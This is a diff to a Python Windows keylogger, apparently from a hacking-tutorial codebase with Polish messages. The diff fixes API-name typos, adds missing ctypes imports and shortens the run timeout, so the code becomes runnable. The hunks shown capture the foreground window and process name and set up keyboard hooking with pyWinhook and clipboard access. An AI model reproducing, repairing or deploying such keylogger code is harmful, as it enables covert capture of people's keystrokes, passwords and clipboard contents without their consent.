@@ -1,17 +1,21 @@
+from ctypes import byref, create_string_buffer, c_ulong, windll
+from io import StringIO
+
 import os
 import pythoncom
 import pyWinhook as pyHook
 import sys
 import time
 import win32clipboard
-TIMEOUT = 60*10
+
+TIMEOUT = 10 
 
 class KeyLogger:
     def __init__(self):
         self.current_window = None
 
     def get_current_process(self):
-        hwnd = windll.user32.GetForegorundWindow()
+        hwnd = windll.user32.GetForegroundWindow()
         pid = c_ulong(0)
         windll.user32.GetWindowThreadProcessId(hwnd, byref(pid))
         process_id = f'{pid.value}'
@@ -27,7 +31,7 @@ class KeyLogger:
         except UnicodeDecodeError as e:
             print(f'{e}: nieznana nazwa okna')
 
-        print('\n', process_id, executeable.value.decode(), self.current_window)
+        print('\n', process_id, executable.value.decode(), self.current_window)
         windll.kernel32.CloseHandle(hwnd)
         windll.kernel32.CloseHandle(h_process)
 
@@ -64,4 +68,3 @@ def run():
 if __name__ == '__main__':
     print(run())
     print('Koniec.')
-
